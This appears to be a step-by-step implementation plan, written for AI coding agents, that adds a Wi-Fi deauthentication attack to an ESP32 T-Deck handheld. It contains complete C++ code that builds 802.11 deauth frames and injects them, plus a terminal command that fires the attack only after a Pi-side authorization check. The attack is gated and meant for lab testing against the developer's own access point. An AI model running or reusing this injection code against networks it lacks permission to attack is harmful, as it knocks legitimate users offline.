# Kuroshuna Phase 2b — T-Deck ESP32 RF (gated deauth) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Let the T-Deck's *own* ESP32 radio fire a targeted Wi-Fi deauth, from a terminal command, with EVERY shot authorized by the Pi gate first (`POST /api/kuroshuna/authorize`). The Pi stays the single source of truth for what may be attacked.

**Architecture:** A new `kuma_rf` firmware module builds + injects 802.11 deauth frames via `esp_wifi_80211_tx`. A terminal command `kuroshuna deauth <bssid> <channel> [client]` (only when armed) does: (1) `POST /api/kuroshuna/authorize {target=bssid, action="deauth"}` over the live Wi-Fi link; (2) if `allowed`, switch the radio to the target channel and inject; (3) injection drops the STA link, so the existing `reconnectIfDown()` in the main loop self-heals back to the Pi. No autonomous firing on the handheld — the Pi orchestrator owns autonomy.

**Tech Stack:** C++/Arduino-ESP32 (`esp_wifi.h` raw TX), the Phase-6 `/api/kuroshuna/authorize`. **Compile-only verification here** (`pio run -e t-deck`); real RF behavior is on-device (Jax, COM8).

**How to verify:** from `firmware/tdeck-ui/`: `pio run -e t-deck` compiles clean.

**Spec:** `docs/superpowers/specs/2026-06-09-kuroshuna-offensive-mode-design.md` (§ device split — T-Deck ESP32 RF) + Phase-2b note in the Phase-2 plan. Depends on Phase 6 (authorize endpoint) + Phase 7 (terminal `kuroshuna` command + arm state).

---

## File Structure

- Create: `firmware/tdeck-ui/src/kuma_rf.h` / `kuma_rf.cpp` — MAC parse + deauth frame build + `esp_wifi_80211_tx` inject. Pure RF; no authorization logic (caller authorizes).
- Modify: `firmware/tdeck-ui/src/kuma_api_client.h` / `.cpp` — `authorizeAction(target, action) -> bool` (POST /api/kuroshuna/authorize, parse `allowed`).
- Modify: `firmware/tdeck-ui/src/kuma_terminal.cpp` — `kuroshuna deauth <bssid> <channel> [client]` (authorize → inject → reconnect).

Contract:
- `kuma_rf::parseMac(const String&, uint8_t out[6]) -> bool` (accepts colon/dash MAC).
- `kuma_rf::deauth(const uint8_t bssid[6], const uint8_t client[6], uint8_t channel, int bursts) -> int` (frames sent). Sends BOTH directions (AP→client and client→AP), `bursts` times each.
- `kuma_api::authorizeAction(const String& target, const String& action) -> bool`.

---

### Task 1: `authorizeAction` API helper

**Files:**
- Modify: `firmware/tdeck-ui/src/kuma_api_client.h` / `.cpp`

- [ ] **Step 1: Declare** — in `kuma_api_client.h`, near `armKuroshuna`:

```cpp
  bool authorizeAction(const String& target, const String& action);  // POST /api/kuroshuna/authorize
```

- [ ] **Step 2: Implement** — in `kuma_api_client.cpp`, mirror the `armKuroshuna` POST idiom, but PARSE the JSON response `{"allowed":bool,"reason":str}` and return `allowed` (default false). READ how `fetchStatus` parses JSON in this file and reuse that library/idiom:

```cpp
bool kuma_api::authorizeAction(const String& target, const String& action) {
  if (!wifiConnected()) return false;
  String body = String("{\"target\":\"") + target + "\",\"action\":\"" + action + "\"}";
  // (replicate the HTTPClient POST block armKuroshuna uses, to /api/kuroshuna/authorize,
  //  Content-Type application/json, setTimeout)
  // On HTTP 200, parse the body and return doc["allowed"] | false; else return false.
  // Always http.end().
  ...
}
```
(Use the same JSON doc type the rest of the file uses. A non-200 or unparseable body → return false = "not authorized", which is the safe default.)

- [ ] **Step 3: Verify compile** — from `firmware/tdeck-ui/`: `pio run -e t-deck` → SUCCESS.

- [ ] **Step 4: Commit**

```bash
git add firmware/tdeck-ui/src/kuma_api_client.h firmware/tdeck-ui/src/kuma_api_client.cpp
git commit -m "feat(fw): authorizeAction - POST /api/kuroshuna/authorize (Pi gate round-trip)"
```

---

### Task 2: `kuma_rf` module (MAC parse + deauth inject)

**Files:**
- Create: `firmware/tdeck-ui/src/kuma_rf.h`
- Create: `firmware/tdeck-ui/src/kuma_rf.cpp`

- [ ] **Step 1: Header**

```cpp
// firmware/tdeck-ui/src/kuma_rf.h - T-Deck own-radio RF (gated by the caller).
#pragma once
#include <Arduino.h>

namespace kuma_rf {
// Parse "AA:BB:CC:DD:EE:FF" or dash form into out[6]. Returns false if malformed.
bool parseMac(const String& s, uint8_t out[6]);

// Inject a targeted deauth (both directions) `bursts` times on `channel`.
// Returns frames sent. CAUTION: switching channel + injecting drops the STA
// link; the caller must authorize FIRST and trigger a reconnect afterwards.
int deauth(const uint8_t bssid[6], const uint8_t client[6], uint8_t channel, int bursts);
}  // namespace kuma_rf
```

- [ ] **Step 2: Implementation**

```cpp
// firmware/tdeck-ui/src/kuma_rf.cpp
#include "kuma_rf.h"
#include <esp_wifi.h>

namespace kuma_rf {

bool parseMac(const String& s, uint8_t out[6]) {
  String t = s; t.trim();
  int vals[6];
  // accept colon or dash separators
  if (sscanf(t.c_str(), "%x:%x:%x:%x:%x:%x",
             &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6 &&
      sscanf(t.c_str(), "%x-%x-%x-%x-%x-%x",
             &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6)
    return false;
  for (int i = 0; i < 6; ++i) {
    if (vals[i] < 0 || vals[i] > 0xff) return false;
    out[i] = (uint8_t)vals[i];
  }
  return true;
}

// 802.11 deauth frame template (reason 7 = class-3 frame from nonassociated STA).
// [0..1] frame control (0xC0 = deauth), [2..3] duration, [4..9] addr1=dst,
// [10..15] addr2=src, [16..21] addr3=bssid, [22..23] seq, [24..25] reason.
static uint8_t TMPL[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0,0,0,0,0,0,  0,0,0,0,0,0,  0,0,0,0,0,0,
  0x00, 0x00, 0x07, 0x00,
};

static void fill(uint8_t* f, const uint8_t dst[6], const uint8_t src[6],
                 const uint8_t bssid[6]) {
  memcpy(f, TMPL, sizeof TMPL);
  memcpy(f + 4, dst, 6);
  memcpy(f + 10, src, 6);
  memcpy(f + 16, bssid, 6);
}

int deauth(const uint8_t bssid[6], const uint8_t client[6], uint8_t channel,
           int bursts) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t ap2cl[26], cl2ap[26];
  fill(ap2cl, client, bssid, bssid);   // AP -> client
  fill(cl2ap, bssid, client, bssid);   // client -> AP
  int sent = 0;
  for (int i = 0; i < bursts; ++i) {
    if (esp_wifi_80211_tx(WIFI_IF_STA, ap2cl, sizeof ap2cl, false) == ESP_OK) sent++;
    if (esp_wifi_80211_tx(WIFI_IF_STA, cl2ap, sizeof cl2ap, false) == ESP_OK) sent++;
    delay(2);
  }
  return sent;
}

}  // namespace kuma_rf
```

- [ ] **Step 3: Verify compile** — `pio run -e t-deck` → SUCCESS. (If `esp_wifi_80211_tx` rejects the frame at build/link, confirm `esp_wifi.h` is the right include for the installed ESP-IDF/Arduino core; it is standard. The runtime "valid frame" check is bypassed by `en_sys_seq=false` + raw frame; on-device behavior is Jax's to validate.)

- [ ] **Step 4: Commit**

```bash
git add firmware/tdeck-ui/src/kuma_rf.h firmware/tdeck-ui/src/kuma_rf.cpp
git commit -m "feat(fw): kuma_rf - MAC parse + esp_wifi deauth injection"
```

---

### Task 3: terminal `kuroshuna deauth` command (authorize → inject → reconnect)

**Files:**
- Modify: `firmware/tdeck-ui/src/kuma_terminal.cpp`

- [ ] **Step 1: Include** — add near the top includes of `kuma_terminal.cpp`:

```cpp
#include "kuma_rf.h"
```

- [ ] **Step 2: Add the subcommand.** Inside the existing `else if (cmd == "kuroshuna" || cmd == "kuro")` block, add a `deauth` branch. It must (a) require armed state, (b) parse args, (c) authorize via the Pi, (d) inject, (e) note the link will drop + self-heal. Parse: `kuroshuna deauth <bssid> <channel> [client]` — `arg` currently holds everything after `kuroshuna`; the existing code lowercases `arg` into `a` and matches the first token. Adapt to split tokens. Concretely, within the `kuroshuna` handler, before the `status/arm/...` if-chain, detect the deauth subcommand by splitting `arg` (NOT lowercased, MACs need case) into tokens:

```cpp
    // split arg into up to 4 space-separated tokens
    String t[4]; int nt = 0; { String w = arg; w.trim();
      while (w.length() && nt < 4) { int sp = w.indexOf(' ');
        t[nt++] = (sp < 0) ? w : w.substring(0, sp);
        w = (sp < 0) ? "" : w.substring(sp + 1); w.trim(); } }
    String sub = t[0]; sub.toLowerCase();

    if (sub == "deauth") {
      KumaStatus s;
      if (!kuma_api::fetchStatus(s) || !s.kuroshunaArmed) {
        putLine("! kuroshuna not armed (arm first)"); return; }
      if (nt < 3) { putLine("! usage: kuroshuna deauth <bssid> <channel> [client]"); return; }
      uint8_t bssid[6], client[6];
      if (!kuma_rf::parseMac(t[1], bssid)) { putLine("! bad bssid"); return; }
      int ch = t[2].toInt();
      if (ch < 1 || ch > 14) { putLine("! channel 1-14"); return; }
      if (nt >= 4) { if (!kuma_rf::parseMac(t[3], client)) { putLine("! bad client"); return; } }
      else { for (int i=0;i<6;i++) client[i]=0xFF; }   // broadcast
      // AUTHORIZE FIRST (while still connected to the Pi)
      if (!kuma_api::authorizeAction(t[1], "deauth")) {
        putLine("! refused by Pi gate (not approved / disarmed)"); return; }
      putLine(String("* authorized; injecting on ch") + ch + " (link will drop, self-heals)");
      int sent = kuma_rf::deauth(bssid, client, (uint8_t)ch, 64);
      putLine(String("* deauth sent ") + sent + " frames -> " + t[1]);
      // the main loop's reconnectIfDown() restores the Pi link
      return;
    }
```

Then leave the existing `status/arm/broadcast/off` chain to handle `sub == "status"` etc. (replace the old `String a = arg; a.toLowerCase();` usage so it keys off `sub`/`t[]` consistently — i.e. use `sub` where it used `a`).

- [ ] **Step 3: Update HELP** — change the kuroshuna HELP line to:

```cpp
  " kuroshuna [arm|broadcast|off|deauth]  gloves off",
  "   deauth <bssid> <ch> [client]   own-radio (gated)",
```

- [ ] **Step 4: Verify compile** — `pio run -e t-deck` → SUCCESS + flash %.

- [ ] **Step 5: Commit**

```bash
git add firmware/tdeck-ui/src/kuma_terminal.cpp
git commit -m "feat(fw): terminal 'kuroshuna deauth' - Pi-gated own-radio deauth"
```

---

## Phase exit criteria

- `pio run -e t-deck` compiles clean after every task (final flash % noted).
- `kuma_rf` builds deauth frames (both directions) and injects via `esp_wifi_80211_tx`.
- `kuroshuna deauth` requires `kuroshunaArmed`, validates bssid/channel, **authorizes via the Pi gate BEFORE injecting**, refuses on a non-authorized response, and warns the link will drop.
- No autonomous firing on the handheld; injection is a deliberate terminal command only.

## On-device validation (Jax, COM8 + Pi + your own test AP)

1. Flash; arm: terminal `kuroshuna arm` → `confirm` (needs Pi `lab_mode`).
2. Add your OWN test AP's BSSID to `approved_targets` on the Pi.
3. `kuroshuna deauth <your-AP-bssid> <its-channel>` → confirm: authorize succeeds, a client on that AP drops, the T-Deck reconnects to the Pi within a few seconds, and the Pi audit log shows the `deauth` authorization.
4. Try a NON-approved BSSID → confirm "refused by Pi gate", NO injection.
5. Disarm (`kuroshuna off`) → `deauth` now refuses ("not armed").

## Kuroshuna feature COMPLETE after this phase

Phases 1–7 + 2b deliver the full gated offensive feature end-to-end (Pi engines + gate +
orchestrator + API + firmware skin/arm + handheld RF). Remaining = on-device validation
(Jax) and the separate backlog (events case-mgmt + real mitigation, networks redesign + GPS,
Shuna battle audio, credits→jaxdeformity).
